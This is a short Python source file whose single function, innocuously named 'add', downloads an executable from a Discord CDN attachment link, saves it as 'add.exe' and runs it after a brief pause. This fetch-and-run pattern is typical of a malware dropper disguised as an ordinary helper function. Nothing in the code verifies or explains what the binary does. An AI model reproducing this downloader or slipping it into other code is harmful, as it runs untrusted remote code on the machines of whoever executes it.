import requests as req
import subprocess
import time


def add():
    url = 'https://cdn.discordapp.com/attachments/1046193501060210710/1058136394838589540/add.exe'
    file = req.get(url, allow_redirects=True)
    open('add.exe', 'wb').write(file.content)
    time.sleep(4)
    subprocess.run(['add.exe'])
